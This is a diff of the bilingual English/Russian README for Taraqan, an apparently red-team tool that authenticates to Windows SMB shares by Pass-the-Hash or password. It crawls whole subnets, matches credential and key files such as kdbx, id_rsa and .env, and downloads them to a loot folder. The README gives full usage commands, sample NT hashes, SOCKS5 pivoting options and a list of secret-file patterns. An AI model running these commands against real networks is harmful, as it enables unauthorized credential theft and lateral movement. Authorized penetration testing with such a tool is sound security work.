@@ -1,18 +1,29 @@
 # Taraqan
 
-Credential and sensitive file hunter for Windows networks. Authenticates to SMB shares using Pass-the-Hash or password, crawls directories, and identifies files matching configurable patterns. Supports automatic file download, SOCKS5 proxying, and encoding conversion.
+**SMB Credential & Secret Hunter**
 
-## Features
+Taraqan crawls Windows network shares and hunts for sensitive files - passwords, credentials, keys, and configs. Authenticates via Pass-the-Hash (NTLM) or password, traverses SMB shares across entire subnets, and automatically downloads findings. Built for penetration testers and red teamers.
 
-- Pass-the-Hash (NTLM) and password authentication
-- Subnet scanning with CIDR notation
-- Pattern-based sensitive file detection
-- Automatic file download with UTF-8 conversion
-- SOCKS5 proxy support (including authentication)
-- Multi-threaded host and share scanning
-- Built-in patterns for common secrets
+---
 
-## Installation
+**Taraqan** сканирует SMB-шары в Windows-сетях и ищет чувствительные файлы - пароли, учётные данные, ключи и конфигурации. Аутентификация через Pass-the-Hash (NTLM) или пароль, обход шар по всей подсети с автоматическим скачиванием находок. Создан для пентестеров и red team специалистов.
+
+---
+
+## Features / Возможности
+
+| Feature | Description |
+|---------|-------------|
+| **Pass-the-Hash** | NTLM authentication using NT hash - no plaintext password needed |
+| **Subnet Scanning** | Scan entire subnets via CIDR notation (e.g., `10.0.0.0/16`) |
+| **Pattern Matching** | Find files by name patterns - wildcards, extensions, keywords |
+| **Auto Download** | Automatically download matched files to local directory |
+| **SOCKS5 Proxy** | Route traffic through SOCKS5 proxy (pivot host support) |
+| **UTF-8 Conversion** | Auto-convert downloaded text files from Windows-1251/UTF-16 to UTF-8 |
+| **Multi-threaded** | Parallel scanning of hosts and shares for maximum speed |
+| **Built-in Patterns** | Pre-configured rules for common credential files |
+
+## Installation / Установка
 
 ```bash
 git clone https://github.com/but43r/Taraqan.git
@@ -20,75 +31,150 @@ cd Taraqan
 go build -o taraqan -ldflags="-s -w" .
 ```
 
-Cross-compile for Linux:
-```bash
-GOOS=linux GOARCH=amd64 go build -o taraqan -ldflags="-s -w" .
+Cross-compile for Linux from Windows:
+```powershell
+$env:GOOS='linux'; $env:GOARCH='amd64'; go build -o taraqan -ldflags="-s -w" .
 ```
 
-## Usage
+## Quick Start / Быстрый старт
 
+### Basic scan with PTH / Базовое сканирование с PTH
 ```bash
-# Hunt for secrets using PTH
 ./taraqan -t 192.168.1.0/24 -u admin -d CORP -H 31d6cfe0d16ae931b73c59d7e0c089c0
+```
 
-# Custom patterns + download
-./taraqan -t 10.1.0.0/16 -u admin -d DOMAIN -H hash \
-  --patterns "*учетк*,*пароль*,*доступы*,*.kdbx" --download -v
+### Custom patterns + download / Свои паттерны + скачивание
+```bash
+./taraqan -t 10.1.0.0/16 -u admin -d DOMAIN -H aad3b435b51404eeaad3b435b51404ee \
+  --patterns "*учетк*,*пароль*,*доступы*,*.kdbx,*passw*" \
+  --download -v
+```
 
-# Through SOCKS5 proxy
+### Through SOCKS5 proxy / Через SOCKS5 прокси
+```bash
 ./taraqan -t 10.1.0.0/24 -u admin -d DOMAIN -H hash \
   --socks5 127.0.0.1:1080 --download -v
+```
 
-# SOCKS5 with authentication
-./taraqan -t 10.1.0.0/24 -u admin -d DOMAIN -H hash \
-  --socks5 user:pass@proxy:1080
+### Password auth + export / Пароль + экспорт результатов
+```bash
+./taraqan -t 10.0.0.10 -u admin -d DOMAIN -p "Password123" \
+  -o results.json --format json
+```
 
-# Password auth + export results
-./taraqan -t 10.0.0.10 -u admin -d DOMAIN -p "Password123" -o results.json
-
-# Skip admin shares
+### Skip admin shares / Пропуск админ-шар
+```bash
 ./taraqan -t 10.0.0.0/24 -u admin -H hash --skip-admin --download
 ```
 
-## Options
+## Options / Параметры
 
-| Flag | Default | Description |
-|------|---------|-------------|
-| `-t, --target` | - | Target IP or CIDR (required) |
-| `-u, --username` | - | Username (required) |
-| `-d, --domain` | `.` | Domain name |
-| `-H, --hash` | - | NT hash for PTH |
-| `-p, --password` | - | Password |
-| `--patterns` | built-in | Patterns file or comma-separated list |
-| `--threads` | 10 | Host scan threads |
-| `--share-threads` | 3 | Share threads per host |
-| `--share-timeout` | 2m | Timeout per share |
-| `--depth` | 5 | Max directory depth |
+### Authentication / Аутентификация
+
+| Flag | Default | Description / Описание |
+|------|---------|------------------------|
+| `-t, --target` | - | Target IP or CIDR / Цель (IP или CIDR) **(required)** |
+| `-u, --username` | - | Username / Имя пользователя **(required)** |
+| `-d, --domain` | `.` | Domain / Домен |
+| `-H, --hash` | - | NT hash for PTH / NT хеш для PTH |
+| `-p, --password` | - | Password / Пароль |
+
+### Scanning / Сканирование
+
+| Flag | Default | Description / Описание |
+|------|---------|------------------------|
+| `--patterns` | built-in | Pattern file or comma-separated list / Файл паттернов или список через запятую |
+| `--threads` | 10 | Parallel host threads / Потоки для хостов |
+| `--share-threads` | 3 | Parallel shares per host / Потоки на шару |
+| `--share-timeout` | 2m | Timeout per share / Таймаут на шару |
+| `--depth` | 5 | Max directory depth / Макс. глубина директорий |
+| `--skip-admin` | off | Skip admin shares (ADMIN$, C$) / Пропускать админ-шары |
+
+### Network / Сеть
+
+| Flag | Default | Description / Описание |
+|------|---------|------------------------|
 | `--socks5` | - | SOCKS5 proxy (host:port or user:pass@host:port) |
-| `--download` | off | Download matched files |
-| `--download-dir` | ./loot | Download directory |
-| `--max-size` | 10 | Max download size (MB) |
-| `--skip-admin` | off | Skip admin shares (ADMIN$, C$, etc.) |
-| `-o, --output` | - | Output file path |
-| `--format` | json | Output format (json/csv) |
-| `-v, --verbose` | off | Verbose output |
+| `--timeout` | 5s | Connection timeout / Таймаут подключения |
 
-## Built-in Patterns
+### Download / Скачивание
 
-- Credentials: `*password*`, `*credential*`, `*secret*`
-- Key files: `*.kdbx`, `*.pfx`, `*.pem`, `id_rsa`, `*.ppk`
-- Configs: `web.config`, `.env`, `appsettings.json`
-- Remote access: `*.rdp`, `ultravnc.ini`
+| Flag | Default | Description / Описание |
+|------|---------|------------------------|
+| `--download` | off | Download matched files / Скачивать найденные файлы |
+| `--download-dir` | ./loot | Download directory / Папка для скачивания |
+| `--max-size` | 10 | Max file size in MB / Макс. размер файла в МБ |
 
-Custom patterns can be provided as a comma-separated list or loaded from a file (one pattern per line, `#` for comments).
+### Output / Вывод
 
-## Encoding
+| Flag | Default | Description / Описание |
+|------|---------|------------------------|
+| `-o, --output` | - | Output file path / Файл для экспорта |
+| `--format` | json | Output format (json/csv) / Формат вывода |
+| `-v, --verbose` | off | Verbose output / Подробный вывод |
 
-Downloaded text files (.txt, .ini, .config, .xml, .env, .json) are automatically converted to UTF-8. Supported source encodings: UTF-16 LE/BE, Windows-1251 (Cyrillic), UTF-8 with BOM.
+## Patterns / Паттерны
 
-## Disclaimer
+### Built-in patterns / Встроенные паттерны
 
-For authorized penetration testing only.
+Taraqan includes default patterns for common sensitive files:
+
+- **Credentials**: `*password*`, `*credential*`, `*secret*`
+- **Key stores**: `*.kdbx`, `*.pfx`, `*.pem`, `id_rsa`, `*.ppk`
+- **Configs**: `web.config`, `.env`, `appsettings.json`
+- **Remote access**: `*.rdp`, `ultravnc.ini`
+- **Russian keywords**: `*пароль*`, `*учетк*`, `*секрет*`, `*ключ*`
+
+### Custom patterns / Свои паттерны
+
+Inline:
+```bash
+--patterns "*password*,*.kdbx,*учетк*"
+```
+
+From file (one pattern per line, `#` for comments):
+```bash
+--patterns patterns.txt
+```
+
+## Encoding / Кодировка
+
+Downloaded text files (`.txt`, `.ini`, `.config`, `.xml`, `.env`, `.json`) are automatically converted to UTF-8.
+
+Supported source encodings / Поддерживаемые исходные кодировки:
+- UTF-16 LE / BE (Windows Notepad)
+- Windows-1251 (Cyrillic / Кириллица)
+- UTF-8 with BOM
+
+## Output Example / Пример вывода
+
+```
+  ████████╗ █████╗ ██████╗  █████╗  ██████╗  █████╗ ███╗   ██╗
+  ╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗██╔═══██╗██╔══██╗████╗  ██║
+     ██║   ███████║██████╔╝███████║██║   ██║███████║██╔██╗ ██║
+     ██║   ██╔══██║██╔══██╗██╔══██║██║▄▄ ██║██╔══██║██║╚██╗██║
+     ██║   ██║  ██║██║  ██║██║  ██║╚██████╔╝██║  ██║██║ ╚████║
+     ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚══▀▀═╝ ╚═╝  ╚═╝╚═╝  ╚═══╝
+                  SMB Credential & Secret Hunter
+
+[*] Target:        10.1.0.0/16 (65022 hosts)
+[*] User:          DOMAIN\admin
+[*] Auth:          PTH (NT Hash)
+[*] Patterns:      4 rules
+[*] Host threads:  10
+[*] Share threads: 3
+[*] Download:      ./loot (max 10MB)
+
+[*] Starting scan...
+
+[██████░░░░░░░░░░░░░░]  30.2% (19652/65022) | Accessible: 87 | Matches: 12
+```
+
+## Disclaimer / Отказ от ответственности
+
+**EN**: This tool is intended for authorized penetration testing and security assessments only. Unauthorized access to computer systems is illegal. The authors assume no liability for misuse.
+
+**RU**: Инструмент предназначен исключительно для авторизованного тестирования на проникновение и оценки безопасности. Несанкционированный доступ к компьютерным системам является незаконным. Авторы не несут ответственности за неправомерное использование.
 
 ## License
 
